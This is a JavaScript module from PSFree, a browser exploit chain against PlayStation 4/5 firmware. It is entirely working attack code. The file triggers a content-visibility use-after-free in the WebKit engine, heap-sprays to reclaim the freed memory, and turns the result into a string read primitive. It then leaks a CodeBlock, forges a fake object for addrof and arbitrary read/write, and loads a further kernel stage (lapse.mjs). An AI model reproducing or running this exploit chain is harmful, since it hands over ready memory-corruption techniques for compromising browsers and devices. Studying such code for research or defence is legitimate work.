/* Copyright (C) 2023-2025 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

import { Int } from './module/int64.mjs';
import { Memory } from './module/mem.mjs';
import { KB, MB } from './module/offset.mjs';
import { BufferView } from './module/rw.mjs';
import {
    die,
    log,
    clear_log,
    sleep,
    hex,
    align,
} from './module/utils.mjs';
import * as config from './config.mjs';
import * as off from './module/offset.mjs';

// Check if we are running on a supported firmware version
const [is_ps4, version] = (() => {
    const value = config.target;
    const is_ps4 = (value & 0x10000) === 0;
    const version = value & 0xffff;
    const [lower, upper] = (() => {
        if (is_ps4) {
            return [0x600, 0x1000];
        } else {
            return [0x100, 0x600];
        }
    })();

    if (!(lower <= version && version < upper)) {
        throw RangeError(`invalid config.target: ${hex(value)}`);
    }

    return [is_ps4, version];
})();

const ssv_len = (() => {
    if (0x600 <= config.target && config.target < 0x650) {
        return 0x58;
    }
    if (config.target >= 0x900) {
        return 0x50;
    }
    if (0x650 <= config.target && config.target < 0x900) {
        return 0x48;
    }
})();

const num_reuses = 15000; // Increased for better heap spray
const DELAY = 100; // Adjusted for better timing
let attemptCount = 0;
const fakeStates = []; // Global array to store fake state objects
const MAX_ATTEMPTS = 10; // Increased max retry attempts

function gc() {
    new Uint8Array(4 * MB);
}

function sread64(str, offset) {
    const low = (
        str.charCodeAt(offset)
        | str.charCodeAt(offset + 1) << 8
        | str.charCodeAt(offset + 2) << 16
        | str.charCodeAt(offset + 3) << 24
    );
    const high = (
        str.charCodeAt(offset + 4)
        | str.charCodeAt(offset + 5) << 8
        | str.charCodeAt(offset + 6) << 16
        | str.charCodeAt(offset + 7) << 24
    );
    return new Int(low, high);
}

function prepare_uaf() {
    // Remove any existing container to avoid conflicts
    const existingContainer = document.querySelector('.container');
    if (existingContainer) {
        existingContainer.remove();
    }

    const container = document.createElement('div');
    container.className = 'container';
    const child = document.createElement('div');
    child.className = 'child';
    container.appendChild(child);
    document.body.appendChild(container);
    return container;
}

async function uaf_ssv(container) {
    const views = [];
    const status = document.getElementById('status');
    log(`ssv_len: ${hex(ssv_len)}`);

    for (let attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
        attemptCount++;
        log(`Attempt #${attemptCount}: Initiating content-visibility UAF...`);
        status.textContent = `Attempt #${attemptCount} in progress...`;

        // Create fake state object
        const fakeState = { data: new ArrayBuffer(ssv_len) };
        fakeStates.push(fakeState);

        // Recreate container and child for each attempt
        const newContainer = prepare_uaf();
        const childElement = newContainer.querySelector('.child');
        if (!childElement) {
            log('Child element not found after creation, retrying...');
            fakeStates.pop();
            gc();
            await sleep(100);
            continue;
        }

        // Set up MutationObserver
        const observer = new MutationObserver(() => {
            log('DOM tree modified, attempting UAF...');
        });

        try {
            observer.observe(newContainer, { childList: true, subtree: true });

            // Trigger UAF
            newContainer.style.contentVisibility = 'hidden';
            childElement.remove();

            await new Promise(resolve => setTimeout(resolve, DELAY));

            newContainer.style.contentVisibility = 'auto';

            // Additional heap spray
            for (let i = 0; i < 200; i++) {
                new Uint8Array(1024 * 1024);
            }

            // Heap spray for reuse
            for (let i = 0; i < num_reuses; i++) {
                const view = new Uint8Array(new ArrayBuffer(ssv_len));
                view[0] = 0x41;
                views.push(view);
            }

            log('Checking for UAF memory reuse...');
            const res = [];
            for (let i = 0; i < views.length; i++) {
                const view = views[i];
                if (view[0] !== 0x41) {
                    log(`view index: ${hex(i)}`);
                    log('found view:');
                    log(view);

                    view[0] = 1;
                    view.fill(0, 1);

                    if (res.length) {
                        res[1] = [new BufferView(view.buffer), { state: fakeStates[0].data }];
                        break;
                    }

                    res[0] = new BufferView(view.buffer);
                    i = num_reuses - 1;
                }
            }

            if (res.length === 2) {
                observer.disconnect();
                newContainer.remove(); // Clean up
                return res;
            }

            log('UAF attempt failed, retrying...');
        } catch (e) {
            log(`UAF trigger failed: ${e.message}, retrying...`);
        }

        observer.disconnect();
        newContainer.remove(); // Clean up
        fakeStates.pop();
        views.length = 0;
        gc();
        await sleep(100);
    }

    die('Failed content-visibility UAF after maximum attempts');
}

class Reader {
    constructor(rstr, rstr_view) {
        this.rstr = rstr;
        this.rstr_view = rstr_view;
        this.m_data = rstr_view.read64(off.strimpl_m_data);
    }

    read8_at(offset) {
        return this.rstr.charCodeAt(offset);
    }

    read32_at(offset) {
        const str = this.rstr;
        return (
            str.charCodeAt(offset)
            | str.charCodeAt(offset + 1) << 8
            | str.charCodeAt(offset + 2) << 16
            | str.charCodeAt(offset + 3) << 24
        ) >>> 0;
    }

    read64_at(offset) {
        return sread64(this.rstr, offset);
    }

    read64(addr) {
        this.rstr_view.write64(off.strimpl_m_data, addr);
        return sread64(this.rstr, 0);
    }

    set_addr(addr) {
        this.rstr_view.write64(off.strimpl_m_data, addr);
    }

    restore() {
        this.rstr_view.write64(off.strimpl_m_data, this.m_data);
        this.rstr_view.write32(off.strimpl_strlen, ssv_len - off.size_strimpl);
    }
}

async function make_rdr(view) {
    let str_wait = 0;
    const strs = [];
    const u32 = new Uint32Array(1);
    const u8 = new Uint8Array(u32.buffer);
    const marker_offset = (ssv_len - off.size_strimpl) - 4;
    const pad = 'B'.repeat(marker_offset);

    log('start string spray');
    while (true) {
        for (let i = 0; i < 0x200; i++) {
            u32[0] = i;
            const str = [pad, String.fromCodePoint(...u8)].join('');
            strs.push(str);
        }

        if (view.read32(off.strimpl_inline_str) === 0x42424242) {
            view.write32(off.strimpl_strlen, 0xffffffff);
            break;
        }

        strs.length = 0;
        gc();
        await sleep();
        str_wait++;
    }
    log(`JSString reused memory at loop: ${str_wait}`);

    const idx = view.read32(off.strimpl_inline_str + marker_offset);
    log(`str index: ${hex(idx)}`);
    log('view:');
    log(view);

    const rstr = Error(strs[idx]).message;
    log(`str len: ${hex(rstr.length)}`);
    if (rstr.length === 0xffffffff) {
        log('confirmed correct leaked');
        const addr = (
            view.read64(off.strimpl_m_data)
            .sub(off.strimpl_inline_str)
        );
        log(`view's buffer address: ${addr}`);
        return new Reader(rstr, view);
    }
    die("JSString wasn't modified");
}

const cons_len = ssv_len - 8*5;
const bt_offset = 0;
const idx_offset = ssv_len - 8*3;
const strs_offset = ssv_len - 8*2;
const src_part = (() => {
    let res = 'var f = 0x11223344;\n';
    for (let i = 0; i < cons_len; i += 8) {
        res += `var a${i} = ${0x100 + i};\n`;
    }
    return res;
})();

async function leak_code_block(reader, bt_size) {
    const rdr = reader;
    const bt = [];
    for (let i = 0; i < bt_size - 0x10; i += 8) {
        bt.push(i);
    }

    const slen = ssv_len;
    const bt_part = `var bt = [${bt}];\nreturn bt;\n`;
    const part = bt_part + src_part;
    const cache = [];
    for (let i = 0; i < 0x100; i++) {
        cache.push(part + `var idx = ${i};\nidx\`foo\`;`);
    }

    const chunkSize = (is_ps4 && version < 0x900) ? 128 * KB : 1 * MB;
    const smallPageSize = 4 * KB;
    const search_addr = align(rdr.m_data, chunkSize);
    log(`search addr: ${search_addr}`);

    log(`func_src:\n${cache[0]}\nfunc_src end`);
    log('start find CodeBlock');
    let winning_off = null;
    let winning_idx = null;
    let winning_f = null;
    let find_cb_loop = 0;
    let fp = 0;
    rdr.set_addr(search_addr);
    loop: while (true) {
        const funcs = [];
        for (let i = 0; i < 0x100; i++) {
            const f = Function(cache[i]);
            f();
            funcs.push(f);
        }

        for (let p = 0; p < chunkSize; p += smallPageSize) {
            for (let i = p; i < p + smallPageSize; i += slen) {
                if (rdr.read32_at(i + 8) !== 0x11223344) {
                    continue;
                }

                rdr.set_addr(rdr.read64_at(i + strs_offset));
                const m_type = rdr.read8_at(5);
                if (m_type !== 0) {
                    rdr.set_addr(search_addr);
                    winning_off = i;
                    winning_idx = rdr.read32_at(i + idx_offset);
                    winning_f = funcs[winning_idx];
                    break loop;
                }
                rdr.set_addr(search_addr);
                fp++;
            }
        }

        find_cb_loop++;
        gc();
        await sleep();
    }
    log(`loop ${find_cb_loop} winning_off: ${hex(winning_off)}`);
    log(`winning_idx: ${hex(winning_idx)} false positives: ${fp}`);

    log('CodeBlock.m_constantRegisters.m_buffer:');
    rdr.set_addr(search_addr.add(winning_off));
    for (let i = 0; i < slen; i += 8) {
        log(`${rdr.read64_at(i)} | ${hex(i)}`);
    }

    const bt_addr = rdr.read64_at(bt_offset);
    const strs_addr = rdr.read64_at(strs_offset);
    log(`immutable butterfly addr: ${bt_addr}`);
    log(`string array passed to tag addr: ${strs_addr}`);

    log('JSImmutableButterfly:');
    rdr.set_addr(bt_addr);
    for (let i = 0; i < bt_size; i += 8) {
        log(`${rdr.read64_at(i)} | ${hex(i)}`);
    }

    log('string array:');
    rdr.set_addr(strs_addr);
    for (let i = 0; i < off.size_jsobj; i += 8) {
        log(`${rdr.read64_at(i)} | ${hex(i)}`);
    }

    return [winning_f, bt_addr, strs_addr];
}

function make_ssv_data(ssv_buf, view, view_p, addr, size) {
    const size_abc = (() => {
        if (is_ps4) {
            return version >= 0x900 ? 0x18 : 0x20;
        } else {
            return version >= 0x300 ? 0x18 : 0x20;
        }
    })();

    const data_len = 9;
    const size_vector = 0x10;
    const off_m_data = 8;
    const off_m_abc = 0x18;
    const voff_vec_abc = 0;
    const voff_abc = voff_vec_abc + size_vector;
    const voff_data = voff_abc + size_abc;

    ssv_buf.write64(off_m_data, view_p.add(voff_data));
    ssv_buf.write32(off_m_data + 8, data_len);
    ssv_buf.write64(off_m_data + 0xc, data_len);

    const CurrentVersion = 6;
    const ArrayBufferTransferTag = 23;
    view.write32(voff_data, CurrentVersion);
    view[voff_data + 4] = ArrayBufferTransferTag;
    view.write32(voff_data + 5, 0);

    ssv_buf.write64(off_m_abc, view_p.add(voff_vec_abc));
    view.write64(voff_vec_abc, view_p.add(voff_abc));
    view.write32(voff_vec_abc + 8, 1);
    view.write32(voff_vec_abc + 0xc, 1);

    if (size_abc === 0x20) {
        view.write64(voff_abc + 0x10, addr);
        view.write32(voff_abc + 0x18, size);
    } else {
        view.write64(voff_abc + 0, addr);
        view.write32(voff_abc + 0x14, size);
    }
}

async function make_arw(reader, view2, pop) {
    const rdr = reader;
    const fakeobj_off = 0x20;
    const fakebt_base = fakeobj_off + off.size_jsobj;
    const indexingHeader_size = 8;
    const arrayStorage_size = 0x18;
    const propertyStorage = 8;
    const fakebt_off = fakebt_base + indexingHeader_size + propertyStorage;

    log('STAGE: leak CodeBlock');
    const bt_size = 0x10 + fakebt_off + arrayStorage_size;
    const [func, bt_addr, strs_addr] = await leak_code_block(rdr, bt_size);

    const view = rdr.rstr_view;
    const view_p = rdr.m_data.sub(off.strimpl_inline_str);
    const view_save = new Uint8Array(view);

    view.fill(0);
    make_ssv_data(view2, view, view_p, bt_addr, bt_size);

    const bt = new BufferView(pop.state);
    view.set(view_save);

    log('ArrayBuffer pointing to JSImmutableButterfly:');
    for (let i = 0; i < bt.length; i += 8) {
        log(`${bt.read64(i)} | ${hex(i)}`);
    }

    const val_true = 7;
    const strs_cell = rdr.read64(strs_addr);

    bt.write64(fakeobj_off, strs_cell);
    bt.write64(fakeobj_off + off.js_butterfly, bt_addr.add(fakebt_off));

    bt.write64(fakebt_off - 0x10, val_true);
    bt.write32(fakebt_off - 8, 1);
    bt.write32(fakebt_off - 8 + 4, 1);

    bt.write64(fakebt_off, 0);
    bt.write32(fakebt_off + 8, 0);
    bt.write32(fakebt_off + 0xc, 1);
    bt.write64(fakebt_off + 0x10, val_true);

    bt.write64(0x10, bt_addr.add(fakeobj_off));

    const fake = func()[0];
    log(`fake.raw: ${fake.raw}`);
    log(`fake[0]: ${fake[0]}`);
    log(`fake: [${fake}]`);

    const test_val = 3;
    log(`Test setting fake[0] to ${test_val}`);
    fake[0] = test_val;
    if (fake[0] !== test_val) {
        die(`unexpected fake[0]: ${fake[0]}`);
    }

    function addrof(obj) {
        fake[0] = obj;
        return bt.read64(fakebt_off + 0x10);
    }

    const worker = new DataView(new ArrayBuffer(1));
    const main_template = new Uint32Array(new ArrayBuffer(off.size_view));
    const leaker = {addr: null, 0: 0};

    const worker_p = addrof(worker);
    const main_p = addrof(main_template);
    const leaker_p = addrof(leaker);

    const scaled_sview = off.size_view / 4;
    const faker = new Uint32Array(scaled_sview);
    const faker_p = addrof(faker);
    const faker_vector = rdr.read64(faker_p.add(off.view_m_vector));

    const vector_idx = off.view_m_vector / 4;
    const length_idx = off.view_m_length / 4;
    const mode_idx = off.view_m_mode / 4;
    const bt_idx = off.js_butterfly / 4;

    faker[vector_idx] = worker_p.lo;
    faker[vector_idx + 1] = worker_p.hi;
    faker[length_idx] = scaled_sview;

    rdr.set_addr(main_p);
    faker[mode_idx] = rdr.read32_at(off.view_m_mode);
    faker[0] = rdr.read32_at(0);
    faker[1] = rdr.read32_at(4);
    faker[bt_idx] = rdr.read32_at(off.js_butterfly);
    faker[bt_idx + 1] = rdr.read32_at(off.js_butterfly + 4);

    bt.write64(fakebt_off + 0x10, faker_vector);
    const main = fake[0];

    log('main (pointing to worker):');
    for (let i = 0; i < off.size_view; i += 8) {
        const idx = i / 4;
        log(`${new Int(main[idx], main[idx + 1])} | ${hex(i)}`);
    }

    new Memory(
        main, worker, leaker,
        leaker_p.add(off.js_inline_prop),
        rdr.read64(leaker_p.add(off.js_butterfly)),
    );
    log('achieved arbitrary r/w');

    rdr.restore();
    view.write32(0, -1);
    view2.write32(0, -1);
    make_arw._buffer = bt.buffer;
}

export async function main() {
    log('STAGE: UAF content-visibility');
    const container = prepare_uaf();
    try {
        const [view, [view2, pop]] = await uaf_ssv(container);
        log('STAGE: get string relative read primitive');
        const rdr = await make_rdr(view);
        log('STAGE: achieve arbitrary read/write primitive');
        await make_arw(rdr, view2, pop);
    } finally {
        container.remove(); // Ensure cleanup
    }

    clear_log();
    try {
        await import('./lapse.mjs');
    } catch (e) {
        log(`Failed to import lapse.mjs: ${e.message}`);
    }
}